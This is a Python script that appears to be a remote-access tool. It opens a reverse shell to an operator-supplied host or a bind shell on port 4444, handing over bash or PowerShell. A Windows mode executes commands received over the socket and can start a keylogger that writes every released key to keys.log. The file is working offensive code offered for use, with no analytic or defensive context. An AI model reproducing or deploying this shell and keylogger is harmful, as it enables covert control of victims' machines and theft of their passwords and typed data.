#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM
from sys import argv, stdin, stdout, stderr
import subprocess
import requests
import keyboard
import os

BUFFER_SIZE = 512
KEYLOG_FILE="keys.log"

def popen(command):
    process = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdout=subprocess.PIPE,
        shell=True)
    return process

def init_shell(s, shell):
    os.dup2(s.fileno(), stdin.fileno())
    os.dup2(s.fileno(), stdout.fileno())
    os.dup2(s.fileno(), stderr.fileno())
    return subprocess.call([shell])

def on_keypress(event):
    print('Pressed key', event.name)
    with open(KEYLOG_FILE, 'a+') as f:
        f.write("%s" %event.name)

def start_keylog():
    keyboard.on_release(callback=on_keypress)

def start_reverse_tcp_win(host, port=4444):
    if ":" in host:
        host, port = host.split(":")
    s = socket(AF_INET, SOCK_STREAM)
    s_addr = (host, int(port))
    s.connect(s_addr)
    s.send(b'Windows client connected')
    listen = True
    while listen:
        s.send(b"\r\n#> ")
        data = s.recv(BUFFER_SIZE)
        if data:
            print('Got data', data.decode())
            if data.decode().strip() == "keylogger":                
                start_keylog()
                s.send(b"Keylogger started and writing to %s" %KEYLOG_FILE)
                continue
            try:
                proc = popen(data.decode('utf-8'))
                stdout, stderr = proc.communicate()
            except Exception as e:
                s.send(str(e).encode('utf-8'))
            print("Stdout", stdout)
            print("Stderr", stderr)
            print("Error code", proc.returncode)
            if stdout:
                s.send(stdout)
            if stderr:
                s.send(stderr)

    
def get_parameters():
    params = dict(
        reverse=False
    )
    for param in argv[1:]:
        print(param)
        param = param.strip()
        if param == '--windows' or param == '-w':
            params['shell'] = 'powershell.exe'
            continue
        if param == "-h" or param == "--help":
            params['help'] = True
            continue
        if param == "--reverse" or param == "-r":
            params['reverse'] = True
            continue
        if not params.get('host') and param[0] != '-':
            params['host'] = param
            continue
    if not params.get('shell'):
        params['shell'] = '/bin/bash' if os.name != 'nt' else 'powershell.exe'
    return params

def usage():
    print("""usage : %s [options]
Options :
    -r --reverse : Start a reverse shell. Must be followed by a host or host:port
    -w --win : Use powershell.exe instead of /bin/bash as a default shell
""" %argv[0])
    return 0

def start_reverse_tcp(shell, host, port=4444):
    if ":" in host:
        host, port = host.split(":")
    s = socket(AF_INET, SOCK_STREAM)
    s_addr = (host, int(port))
    s.connect(s_addr)
    listen = True
    init_shell(s, shell)

def start_tcp_bind(shell, host="0.0.0.0", port=4444): 
    if ":" in host:
        host, port = host.split(":")
    print('host is', host, port)
    s = socket(AF_INET, SOCK_STREAM)
    s_addr = (host, int(port))
    s.bind(s_addr)
    s.listen(1)
    listen = True
    print("Listening for TCP connections on %s:%s" %(host, port))
    while listen:
        connection, c_addr = s.accept()
        init_shell(connection, shell)
    s.close()

def main():
    params = get_parameters()
    if params.get('help'):
        return usage()
    print('params are', params)
    if params.get('reverse'):
        if os.name != 'nt':
            start_reverse_tcp(params.get('shell'), params.get('host'))
        else:
            start_reverse_tcp_win(params.get('host'))
    else:
        if params.get('host'):
            start_tcp_bind(params.get('shell'), params.get('host'))
        else:
            start_tcp_bind(params.get('shell'))
    return

if __name__ == "__main__":
    main()
